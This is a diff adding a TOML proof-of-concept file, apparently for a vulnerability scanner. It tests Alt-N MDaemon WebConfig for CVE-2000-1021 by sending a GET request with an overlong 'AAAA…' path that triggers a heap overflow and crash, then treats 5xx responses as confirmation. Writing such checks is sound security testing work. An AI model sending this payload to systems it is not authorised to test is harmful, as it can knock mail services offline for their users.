@@ -1,0 +1,33 @@
+[info]
+author = "ave"
+description = "通过向 MDaemon WebConfig HTTP 服务发送超长 URL 路径的 GET 请求，验证目标是否存在 CVE-2000-1021 堆溢出拒绝服务漏洞。服务崩溃或连接断开即表明存在漏洞。"
+id = "POC-AVE-2000-0743"
+name = "Alt-N MDaemon WebConfig 远程堆溢出 DoS PoC"
+severity = "high"
+tags = ["ave-2000-0743"]
+vuln_id = [
+    "CVE-2000-1021",
+    "AVE-2000-0743",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+protocol = "http"
+
+[poc.requests.headers]
+Connection = "close"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    500,
+    502,
+    503,
+    504,
+]
+type = "status"
